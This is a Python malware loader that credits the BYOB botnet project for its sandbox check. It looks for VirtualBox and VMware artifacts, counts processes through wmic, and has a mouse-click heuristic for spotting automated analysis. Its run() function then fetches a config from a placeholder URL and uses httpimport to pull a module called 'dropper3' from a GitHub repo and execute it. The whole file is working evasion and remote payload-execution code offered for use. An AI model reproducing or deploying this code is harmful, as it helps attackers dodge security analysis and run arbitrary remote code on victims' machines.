####################################################
####################################################
#### DISCLAMERL: FULL CREDITS TO                ####
#### MALWAREDLLC/BYOB FOR THIS SANDBOX CHECK!!! ####
####################################################
####################################################

import os
def environment():
    environment = [key for key in os.environ if 'VBOX' in key and not key in ["VBOX_MSI_INSTALL_PATH"]] #whitlist virtualbox installed in user (only positive if in sandbox enviroment) 
    processes = [line.split()[0 if os.name == 'nt' else -1] for line in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if line.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]

    # Running the aforementioned command and saving its output
    output = os.popen('wmic process get description, processid').read()

    # Displaying the output
    lst = output.split("\n")
    while "" in lst:
        lst.remove("")
    if len(lst) < 30: return False
    def mouse():
        import ctypes
        import math
        import time
        def DetectClick(button, watchtime = 300):
            '''Waits watchtime seconds. Returns True on click, False otherwise'''
            if button in (1, '1', 'l', 'L', 'left', 'Left', 'LEFT'):
                bnum = 0x01
            elif button in (2, '2', 'r', 'R', 'right', 'Right', 'RIGHT'):
                bnum = 0x02

            start = time.time()
            while 1:
                output =  ctypes.windll.user32.GetKeyState(bnum) not in [0, 1]
                if output:
                    # ^ this returns either 0 or 1 when button is not being held down
                    global clicks, last_click_time, last_frequency, sus, freq
                    clicks += 1
                    if not time.time() >  last_click_time + 0.2:
                        sus += 1
                        if sus / clicks * 100 >= 50 and clicks > 10: return False # if 35 percent or more where "SUS" make sure the clicks are up tho
                    freq += 1 if math.isclose((time.time() - last_click_time), last_frequency, abs_tol=0.01) else 0
                    if freq / clicks * 100 >= 30: return False # the click delay is timed "to perfectly" and 15 percent or more, abort
                    last_frequency = time.time() - last_click_time
                    last_click_time = time.time()
                    output = ctypes.windll.user32.GetKeyState(bnum) not in [0, 1]
                    while output:
                        output = ctypes.windll.user32.GetKeyState(bnum) not in [0, 1]
                    
                    return True
                elif time.time() - start >= watchtime:
                    break
                time.sleep(0.001)
            return False
        global clicks, last_click_time, last_frequency, sus, freq
        sus = 0
        freq = 0
        last_frequency = 0
        last_click_time = time.time()
        clicks = 0
        while not clicks >= 100:
            print(clicks)
            DetectClick(1)
        return True
    return False #bool(environment + processes) or not mouse()

def run():
    if not environment():
        import httpimport, requests, json
        config_url = "CONFIG_URL"
        config_text = requests.get(config_url).text
        config = json.loads(config_text)
        with httpimport.github_repo(config["module_config"]["github_username"], config["module_config"]["github_repo"]):
            import dropper3
            dropper3.run()
run()